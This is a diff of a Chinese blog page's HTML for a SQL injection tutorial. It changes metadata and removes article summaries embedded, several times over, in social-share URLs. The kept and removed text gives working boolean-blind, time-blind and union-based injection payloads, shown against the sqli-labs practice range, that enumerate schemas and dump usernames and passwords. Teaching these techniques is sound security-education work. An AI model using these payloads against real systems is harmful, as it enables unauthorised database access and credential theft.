@@ -33,8 +33,7 @@
   <!-- 页面元数据 -->
   <title>常见sql注入手法总结与技巧(一) - GhostToKnow</title>
   <meta name="keywords" content="SQL注入,安全基础,null">
-  <meta desc name="description" content="前言SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。
-sql注入是最为常见也是破坏力很大的漏洞，它是因为开发在开发时没有对用户的输入行为进行判断和过滤，使得用户输入了恶意语句后传给了后端数据... - GhostToKnow - GhostToKnow">
+  <meta desc name="description" content="GhostToKnow - GhostToKnow - GhostToKnow">
   
 <meta property="og:type" content="article">
 <meta property="og:title" content="常见sql注入手法总结与技巧(一)">
@@ -44,7 +43,7 @@ sql注入是最为常见也是破坏力很大的漏洞，它是因为开发在�
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2023-03-24T11:48:48.000Z">
-<meta property="article:modified_time" content="2023-03-29T13:06:44.858Z">
+<meta property="article:modified_time" content="2023-03-29T13:20:40.806Z">
 <meta property="article:author" content="GhostToKnow">
 <meta property="article:tag" content="SQL注入,安全基础">
 <meta name="twitter:card" content="summary">
@@ -1628,7 +1627,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1680095487359),
+    lastupdate: new Date(1680096741188),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","lastupdate"],
       for_post: ["toc"],
@@ -2555,7 +2554,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><code>-1&#39; union select 1,(select group_concat(id,username,password) from users),3 --+</code></p>
 <p><img src="https://s3.bmp.ovh/imgs/2023/03/24/b39f3864d2e582ae.png" class="lazyload" data-srcset="https://s3.bmp.ovh/imgs/2023/03/24/b39f3864d2e582ae.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3 --+</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),3 --+</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(id,username,password) from users),3 --+</span></span><br></pre></td></tr></table></figure>
-<span id="more"></span>
 
   </div>
   
@@ -2580,7 +2578,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-03-29T14:06:44+01:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-03-29T14:20:40+01:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：Mar 29, 2023</p>
@@ -2606,108 +2604,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/&title=常见sql注入手法总结与技巧(一) - GhostToKnow&summary=前言SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。
-sql注入是最为常见也是破坏力很大的漏洞，它是因为开发在开发时没有对用户的输入行为进行判断和过滤，使得用户输入了恶意语句后传给了后端数据库进行相应的动作（如增删改查甚至写后门）。
-根本产生原因：后端服务器接收传来的参数未经过严格过滤判断而直接进入数据库查询
-所以在学习SQL注入前需要了解SQL基础语法
-SQL注入根源分析如果后台sql语句为：
-1$sql=&quot;SELECT * FROM users WHERE id=&#x27; $id &#x27; LIMIT 0,1&quot;;
-
-如果我们传入id&#x3D;1’  那么如果后端没有经过过滤而是直接把我们传入的参数带进sql语句中，那么sql语句就会变成：
-1$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;;
-
-我们传入的 ‘ 就会一块带入和前面的单引号进行闭合，导致原来后面的单引号就多余，而sql语句引号是必须成对出现的就会报错什么都查不出来，但如果我们在1’后面加入恶意语句并且把后面的原来的语句进行注解，就会造成sql语句会执行我们传入的恶意语句，实现注入。
-12id = -1&#x27; union select database() #$sql=&quot;SELECT * FROM users WHERE id=&#x27;-1&#x27; union select database() #&#x27; LIMIT 0,1&quot;;
-
--1表示查询一个不存在的id，是为了不影响后面我们的注入语句
-#,–+,– 表示注释，把后面所有语句注释掉，这样就不会影响我们的注入语句
-sql参数类型分类SQL注入按照参数类型分类可分为两种：数字型和字符型
-
-数字型：select * from table where id&#x3D;2
-字符型：select * from table where id&#x3D;’2’
-
-区别在于数字型不需要单引号进行闭合，而字符型一般需要通过单引号闭合。
-判断类型方法：
-​	构造payload为：id=1 order by 9999 --+
-如果正确返回页面，则为字符型；否则，为数字型
-​	构造payload为：1 and 1=2
-如果正确返回页面，则为字符型；否则，为数字型
-常见sql注入手法这里先给出常用的payload，后面会使用到
-1234567select database()select group_concat(table_name)from information_schema.tables where table_schema=database()select group_concat(column_name)from information_schema.columns where table_name=&#x27;xxxx&#x27;select group_concat(字段名) from 表名
-
-常见注入手法分类布尔盲注
-时间盲注
-union联合注入
-报错注入
-堆叠注入
-二次注入
-宽字节注入
-通过sql注入写webshell
-通过http header注入
-…
-盲注通常根据SQL注入是否有回显将其分为有回显的注入和无回显的注入，其中无回显的注入就是盲注。
-我们的注入语句可能会让网页呈现两种状态，例如“查询成功”，“查询失败”，相当于true和false。也可能是一句“查询完成”或者什么都不说。虽然并不能直接得到数据库中的具体数据，但是SQL语句的拼接已经发生了，非法的SQL也执行了，SQL注入攻击就发生了，只是SQL注入的结果不能直接拿到。
-盲注就是针对这种无回显的情况，盲注就像是爆破，在进行SQL盲注时，大致过程为：
-12345678如果&quot;数据库XX&quot;的第一个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是c，就返回“查询成功”，否则返回“查询失败”...如果&quot;数据库XX&quot;的第二个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是c，就返回“查询成功”，否则返回“查询失败”...
-
-通过这样不断的测试爆破，根据回显的“查询成功”和“查询失败”，判断出具体数据的每一位是什么，就可以完整的得到这个数据的具体值了。
-布尔盲注下面使用sqli-labs靶场演示,less-8关
-查询成功返回You are in….
-
-而查询失败则什么都不显示
-
-返回You are in….相当于是“查询成功”，而什么都没显示则相当于是“查询失败”。所以我们构造的判断语句，可以根据页面是否有You are in….来充当判断条件。
-要使用的sql函数：
-substr(要截取的字符串，从哪一位开始截取，截取多长)
-ascii()返回传入字符串的首字母的ASCII码
-获取当前数据库名
-12345678910111213141.判断当前数据库名的长度id=1&#x27; and length(database())=8 --+  //有回显判断到等于8时出现You are in....说明语句执行正确，当前数据库长度为8个字符2.判断当前数据库名//判断数据库的第一个字符id=1&#x27; and ascii(substr(database(),1,1))=115 --+//判断数据库的第二个字符id=1&#x27; and ascii(substr(database(),2,1))=101 --+//判断数据库的第三个字符id=1&#x27; and ascii(substr(database(),3,1))=99 --+...数据库为 security
-
-获取当前库的表名
-123456789判断每个表名的每个字符的ascii值//判断第一个表的第一个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+//判断第一个表的第二个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+...判断出存在表 emails、referers、uagents、users 
-
-获取表的字段
-123456789猜测users表比较重要，先查询users表//判断第一个字段的第一个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=117 --+//判断第一个字段的第二个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))=115 --+...users表中存在 id、username、password 字段
-
-获取字段中的数据
-12345//判断id字段的第一行数据的第一个字符id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))=100 --+//判断id字段的第二行数据的第二个字符id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))=100 --+...
-
-手工去盲注太过繁琐，不建议手工注入，可借助工具或者写脚本跑
-时间盲注时间盲注也叫延迟注入。在页面没有回显数据，也没有可以充当判断条件的地方，也没有报错信息，就可以考虑尝试时间盲注。时间盲注就是将页面的反响时间作为判断依据，来注入出数据库的信息。
-以Less-9为例，当我们以id&#x3D;1’ and sleep(5) –+ 进行注入，可以明显的感觉到页面返回响应的时间变长了，大概拉长了5秒左右，这说明构造的sleep(5)语句起作用了。我们可以把这个当作判断依据，配合if语句使用。
-if(a,b,c) 如果a的值为true，则返回b的值，如果a的值为false，则返回c的值。
-获取数据库名
-123456//查询数据库名第一个字符id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+明显感受到页面延迟了几秒，说明数据库名字第一个字符是s。//查询数据库名第二个字符id=1&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+...
-
-与盲注类似，后面就是爆破字符，再爆表名，字段名，具体数据。
-不建议手注，建议编写脚本或使用工具
-union联合注入第一步，测试注入点，一些小技巧：利用引号，and 1&#x3D;1 ，or 1&#x3D;1 等判断是字符型还是数字型
-
-正常返回判断是字符型
-第二步，利用order by 查表得到到字段个数
-
-
-查到3时正常返回但到4时报错说明当前表中只有三列
-第三步，利用union select 1,2,3..判断回显位，如果有回显，找到回显位，回显位也就是回显页面有我们设置的1,2,3的位置
-
-发现者里有2和3的回显位,在name和Password回显
-第四步，爆库，爆表，爆字段名，爆值
-为什么用-1 ：因为-1大概率会返回空表，union select联合查询会返回一张表，就只会显示后面联合查询表
-组合使用上面提到的常用的payload，放在页面回显位上
--1&#39; union select 1,(select database()),3 --+
-
--1&#39; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+
-
-爆出4个表，选择爆users表
--1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;),3 --+
-
-发现查询出了很多字段应该爆错了不是我们需要的那个表，可能其他库里也有users表，这样要加一条限制语句，查security库里的users表
--1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 --+
-
-爆字段的数据
--1&#39; union select 1,(select group_concat(id,username,password) from users),3 --+
-
-12345-1&#x27; union select 1,(select database()),3 --+-1&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(id,username,password) from users),3 --+"
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/&title=常见sql注入手法总结与技巧(一) - GhostToKnow&summary="
           
           >
           
@@ -2719,108 +2616,7 @@ union联合注入第一步，测试注入点，一些小技巧：利用引号，
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/&title=常见sql注入手法总结与技巧(一) - GhostToKnow&summary=前言SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。
-sql注入是最为常见也是破坏力很大的漏洞，它是因为开发在开发时没有对用户的输入行为进行判断和过滤，使得用户输入了恶意语句后传给了后端数据库进行相应的动作（如增删改查甚至写后门）。
-根本产生原因：后端服务器接收传来的参数未经过严格过滤判断而直接进入数据库查询
-所以在学习SQL注入前需要了解SQL基础语法
-SQL注入根源分析如果后台sql语句为：
-1$sql=&quot;SELECT * FROM users WHERE id=&#x27; $id &#x27; LIMIT 0,1&quot;;
-
-如果我们传入id&#x3D;1’  那么如果后端没有经过过滤而是直接把我们传入的参数带进sql语句中，那么sql语句就会变成：
-1$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;;
-
-我们传入的 ‘ 就会一块带入和前面的单引号进行闭合，导致原来后面的单引号就多余，而sql语句引号是必须成对出现的就会报错什么都查不出来，但如果我们在1’后面加入恶意语句并且把后面的原来的语句进行注解，就会造成sql语句会执行我们传入的恶意语句，实现注入。
-12id = -1&#x27; union select database() #$sql=&quot;SELECT * FROM users WHERE id=&#x27;-1&#x27; union select database() #&#x27; LIMIT 0,1&quot;;
-
--1表示查询一个不存在的id，是为了不影响后面我们的注入语句
-#,–+,– 表示注释，把后面所有语句注释掉，这样就不会影响我们的注入语句
-sql参数类型分类SQL注入按照参数类型分类可分为两种：数字型和字符型
-
-数字型：select * from table where id&#x3D;2
-字符型：select * from table where id&#x3D;’2’
-
-区别在于数字型不需要单引号进行闭合，而字符型一般需要通过单引号闭合。
-判断类型方法：
-​	构造payload为：id=1 order by 9999 --+
-如果正确返回页面，则为字符型；否则，为数字型
-​	构造payload为：1 and 1=2
-如果正确返回页面，则为字符型；否则，为数字型
-常见sql注入手法这里先给出常用的payload，后面会使用到
-1234567select database()select group_concat(table_name)from information_schema.tables where table_schema=database()select group_concat(column_name)from information_schema.columns where table_name=&#x27;xxxx&#x27;select group_concat(字段名) from 表名
-
-常见注入手法分类布尔盲注
-时间盲注
-union联合注入
-报错注入
-堆叠注入
-二次注入
-宽字节注入
-通过sql注入写webshell
-通过http header注入
-…
-盲注通常根据SQL注入是否有回显将其分为有回显的注入和无回显的注入，其中无回显的注入就是盲注。
-我们的注入语句可能会让网页呈现两种状态，例如“查询成功”，“查询失败”，相当于true和false。也可能是一句“查询完成”或者什么都不说。虽然并不能直接得到数据库中的具体数据，但是SQL语句的拼接已经发生了，非法的SQL也执行了，SQL注入攻击就发生了，只是SQL注入的结果不能直接拿到。
-盲注就是针对这种无回显的情况，盲注就像是爆破，在进行SQL盲注时，大致过程为：
-12345678如果&quot;数据库XX&quot;的第一个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是c，就返回“查询成功”，否则返回“查询失败”...如果&quot;数据库XX&quot;的第二个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是c，就返回“查询成功”，否则返回“查询失败”...
-
-通过这样不断的测试爆破，根据回显的“查询成功”和“查询失败”，判断出具体数据的每一位是什么，就可以完整的得到这个数据的具体值了。
-布尔盲注下面使用sqli-labs靶场演示,less-8关
-查询成功返回You are in….
-
-而查询失败则什么都不显示
-
-返回You are in….相当于是“查询成功”，而什么都没显示则相当于是“查询失败”。所以我们构造的判断语句，可以根据页面是否有You are in….来充当判断条件。
-要使用的sql函数：
-substr(要截取的字符串，从哪一位开始截取，截取多长)
-ascii()返回传入字符串的首字母的ASCII码
-获取当前数据库名
-12345678910111213141.判断当前数据库名的长度id=1&#x27; and length(database())=8 --+  //有回显判断到等于8时出现You are in....说明语句执行正确，当前数据库长度为8个字符2.判断当前数据库名//判断数据库的第一个字符id=1&#x27; and ascii(substr(database(),1,1))=115 --+//判断数据库的第二个字符id=1&#x27; and ascii(substr(database(),2,1))=101 --+//判断数据库的第三个字符id=1&#x27; and ascii(substr(database(),3,1))=99 --+...数据库为 security
-
-获取当前库的表名
-123456789判断每个表名的每个字符的ascii值//判断第一个表的第一个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+//判断第一个表的第二个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+...判断出存在表 emails、referers、uagents、users 
-
-获取表的字段
-123456789猜测users表比较重要，先查询users表//判断第一个字段的第一个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=117 --+//判断第一个字段的第二个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))=115 --+...users表中存在 id、username、password 字段
-
-获取字段中的数据
-12345//判断id字段的第一行数据的第一个字符id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))=100 --+//判断id字段的第二行数据的第二个字符id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))=100 --+...
-
-手工去盲注太过繁琐，不建议手工注入，可借助工具或者写脚本跑
-时间盲注时间盲注也叫延迟注入。在页面没有回显数据，也没有可以充当判断条件的地方，也没有报错信息，就可以考虑尝试时间盲注。时间盲注就是将页面的反响时间作为判断依据，来注入出数据库的信息。
-以Less-9为例，当我们以id&#x3D;1’ and sleep(5) –+ 进行注入，可以明显的感觉到页面返回响应的时间变长了，大概拉长了5秒左右，这说明构造的sleep(5)语句起作用了。我们可以把这个当作判断依据，配合if语句使用。
-if(a,b,c) 如果a的值为true，则返回b的值，如果a的值为false，则返回c的值。
-获取数据库名
-123456//查询数据库名第一个字符id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+明显感受到页面延迟了几秒，说明数据库名字第一个字符是s。//查询数据库名第二个字符id=1&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+...
-
-与盲注类似，后面就是爆破字符，再爆表名，字段名，具体数据。
-不建议手注，建议编写脚本或使用工具
-union联合注入第一步，测试注入点，一些小技巧：利用引号，and 1&#x3D;1 ，or 1&#x3D;1 等判断是字符型还是数字型
-
-正常返回判断是字符型
-第二步，利用order by 查表得到到字段个数
-
-
-查到3时正常返回但到4时报错说明当前表中只有三列
-第三步，利用union select 1,2,3..判断回显位，如果有回显，找到回显位，回显位也就是回显页面有我们设置的1,2,3的位置
-
-发现者里有2和3的回显位,在name和Password回显
-第四步，爆库，爆表，爆字段名，爆值
-为什么用-1 ：因为-1大概率会返回空表，union select联合查询会返回一张表，就只会显示后面联合查询表
-组合使用上面提到的常用的payload，放在页面回显位上
--1&#39; union select 1,(select database()),3 --+
-
--1&#39; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+
-
-爆出4个表，选择爆users表
--1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;),3 --+
-
-发现查询出了很多字段应该爆错了不是我们需要的那个表，可能其他库里也有users表，这样要加一条限制语句，查security库里的users表
--1&#39; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 --+
-
-爆字段的数据
--1&#39; union select 1,(select group_concat(id,username,password) from users),3 --+
-
-12345-1&#x27; union select 1,(select database()),3 --+-1&#x27; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 --+-1&#x27; union select 1,(select group_concat(id,username,password) from users),3 --+"
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/&title=常见sql注入手法总结与技巧(一) - GhostToKnow&summary="
           
           >
           
@@ -2832,108 +2628,7 @@ union联合注入第一步，测试注入点，一些小技巧：利用引号，
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2023/03/24/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93%E4%B8%8E%E6%8A%80%E5%B7%A7-%E4%B8%80/&title=常见sql注入手法总结与技巧(一) - GhostToKnow&summary=前言SQL 是 Structured Query Language 的缩写，中文译为“结构化查询语言”。SQL 是一种计算机语言，用来存储、检索和修改关系型数据库中存储的数据。
-sql注入是最为常见也是破坏力很大的漏洞，它是因为开发在开发时没有对用户的输入行为进行判断和过滤，使得用户输入了恶意语句后传给了后端数据库进行相应的动作（如增删改查甚至写后门）。
-根本产生原因：后端服务器接收传来的参数未经过严格过滤判断而直接进入数据库查询
-所以在学习SQL注入前需要了解SQL基础语法
-SQL注入根源分析如果后台sql语句为：
-1$sql=&quot;SELECT * FROM users WHERE id=&#x27; $id &#x27; LIMIT 0,1&quot;;
-
-如果我们传入id&#x3D;1’  那么如果后端没有经过过滤而是直接把我们传入的参数带进sql语句中，那么sql语句就会变成：
-1$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27;&#x27; LIMIT 0,1&quot;;
-
-我们传入的 ‘ 就会一块带入和前面的单引号进行闭合，导致原来后面的单引号就多余，而sql语句引号是必须成对出现的就会报错什么都查不出来，但如果我们在1’后面加入恶意语句并且把后面的原来的语句进行注解，就会造成sql语句会执行我们传入的恶意语句，实现注入。
-12id = -1&#x27; union select database() #$sql=&quot;SELECT * FROM users WHERE id=&#x27;-1&#x27; union select database() #&#x27; LIMIT 0,1&quot;;
-
--1表示查询一个不存在的id，是为了不影响后面我们的注入语句
-#,–+,– 表示注释，把后面所有语句注释掉，这样就不会影响我们的注入语句
-sql参数类型分类SQL注入按照参数类型分类可分为两种：数字型和字符型
-
-数字型：select * from table where id&#x3D;2
-字符型：select * from table where id&#x3D;’2’
-
-区别在于数字型不需要单引号进行闭合，而字符型一般需要通过单引号闭合。
-判断类型方法：
-​	构造payload为：id=1 order by 9999 --+
-如果正确返回页面，则为字符型；否则，为数字型
-​	构造payload为：1 and 1=2
-如果正确返回页面，则为字符型；否则，为数字型
-常见sql注入手法这里先给出常用的payload，后面会使用到
-1234567select database()select group_concat(table_name)from information_schema.tables where table_schema=database()select group_concat(column_name)from information_schema.columns where table_name=&#x27;xxxx&#x27;select group_concat(字段名) from 表名
-
-常见注入手法分类布尔盲注
-时间盲注
-union联合注入
-报错注入
-堆叠注入
-二次注入
-宽字节注入
-通过sql注入写webshell
-通过http header注入
-…
-盲注通常根据SQL注入是否有回显将其分为有回显的注入和无回显的注入，其中无回显的注入就是盲注。
-我们的注入语句可能会让网页呈现两种状态，例如“查询成功”，“查询失败”，相当于true和false。也可能是一句“查询完成”或者什么都不说。虽然并不能直接得到数据库中的具体数据，但是SQL语句的拼接已经发生了，非法的SQL也执行了，SQL注入攻击就发生了，只是SQL注入的结果不能直接拿到。
-盲注就是针对这种无回显的情况，盲注就像是爆破，在进行SQL盲注时，大致过程为：
-12345678如果&quot;数据库XX&quot;的第一个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第一个字母是c，就返回“查询成功”，否则返回“查询失败”...如果&quot;数据库XX&quot;的第二个字母是a，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是b，就返回“查询成功”，否则返回“查询失败”如果&quot;数据库XX&quot;的第二个字母是c，就返回“查询成功”，否则返回“查询失败”...
-
-通过这样不断的测试爆破，根据回显的“查询成功”和“查询失败”，判断出具体数据的每一位是什么，就可以完整的得到这个数据的具体值了。
-布尔盲注下面使用sqli-labs靶场演示,less-8关
-查询成功返回You are in….
-
-而查询失败则什么都不显示
-
-返回You are in….相当于是“查询成功”，而什么都没显示则相当于是“查询失败”。所以我们构造的判断语句，可以根据页面是否有You are in….来充当判断条件。
-要使用的sql函数：
-substr(要截取的字符串，从哪一位开始截取，截取多长)
-ascii()返回传入字符串的首字母的ASCII码
-获取当前数据库名
-12345678910111213141.判断当前数据库名的长度id=1&#x27; and length(database())=8 --+  //有回显判断到等于8时出现You are in....说明语句执行正确，当前数据库长度为8个字符2.判断当前数据库名//判断数据库的第一个字符id=1&#x27; and ascii(substr(database(),1,1))=115 --+//判断数据库的第二个字符id=1&#x27; and ascii(substr(database(),2,1))=101 --+//判断数据库的第三个字符id=1&#x27; and ascii(substr(database(),3,1))=99 --+...数据库为 security
-
-获取当前库的表名
-123456789判断每个表名的每个字符的ascii值//判断第一个表的第一个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+//判断第一个表的第二个字符id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+...判断出存在表 emails、referers、uagents、users 
-
-获取表的字段
-123456789猜测users表比较重要，先查询users表//判断第一个字段的第一个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=117 --+//判断第一个字段的第二个字符id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),2,1))=115 --+...users表中存在 id、username、password 字段
-
-获取字段中的数据
-12345//判断id字段的第一行数据的第一个字符id=1&#x27; and ascii(substr((select id from users limit  0,1),1,1))=100 --+//判断id字段的第二行数据的第二个字符id=1&#x27; and ascii(substr((select id from users limit 0,1),2,1))=100 --+...
-
-手工去盲注太过繁琐，不建议手工注入，可借助工具或者写脚本跑
-时间盲注时间盲注也叫延迟注入。在页面没有回显数据，也没有可以充当判断条件的地方，也没有报错信息，就可以考虑尝试时间盲注。时间盲注就是将页面的反响时间作为判断依据，来注入出数据库的信息。
-以Less-9为例，当我们以id&#x3D;1’ and sleep(5) –+ 进行注入，可以明显的感觉到页面返回响应的时间变长了，大概拉长了5秒左右，这说明构造的sleep(5)语句起作用了。我们可以把这个当作判断依据，配合if语句使用。
-if(a,b,c) 如果a的值为true，则返回b的值，如果a的值为false，则返回c的值。
-获取数据库名
-123456//查询数据库名第一个字符id=1&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+明显感受到页面延迟了几秒，说明数据库名字第一个字符是s。//查询数据库名第二个字符id=1&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+...
-
-与盲注类似，后面就是爆破字符，再爆表名，字段名，具体数据。
-不建议手注，建议编写脚本或使用工具
-union联合注入第一步，测试注入点，一些小技巧：利用引号，and 1&#x3D;1 ，or 1&#x3D;1 等判断是字符型还是数字型
-
-正常返回判断是字符型
-第二步，利用order by 查表得到到字段个数
-
-
-查到3时正常返回但到4时报错说明当前表中只有三列
-第三步，利用union select 1,2,3..判断回显位，如果有回显，找到回显位，回显位也就是回显页面有我们设置的1,2,3的位置
-
-发现者里有2和3的回显位,在name和Password回显
-第四步，爆库，爆表，爆字段名，爆值
-为什么用-1 ：因为-1大概率会返回空表，union select联合查询会返回一张表，就只会显示后面联合查询表
-组合使用上面提到的常用的payload，放在页面回显位上
--1&#39; union select 1,(select database()),3 --+
-
--1&#39; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 --+
-
